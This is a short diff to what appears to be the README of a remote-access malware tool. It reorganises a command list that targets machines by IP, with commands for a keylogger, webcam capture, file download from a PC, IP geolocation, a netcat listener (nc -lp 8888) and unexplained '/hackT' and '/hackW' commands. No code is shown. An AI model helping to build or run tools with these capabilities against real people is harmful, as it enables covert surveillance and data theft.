@@ -61,8 +61,11 @@ ENTER
 - /ipPublic ```IP``` (Geolocate IP)
 - /download ```IP``` ```file``` (Download a file from a PC)
 - /keylogger ```IP``` ```time```
-- /hackT ```IP``` 
-- /hackW ```IP```
 - /webcam ```IP```
 - /nc ```IP``` (nc -lp 8888)
+
+#### Extra :squirrel: 
+
+- /hackT ```IP``` 
+- /hackW ```IP```
 - <img src="https://static-cdn.jtvnw.net/emoticons/v1/112290/1.0" width="15px" height="15px" /> /twitch ```IP``` ```STREAM_KEY```
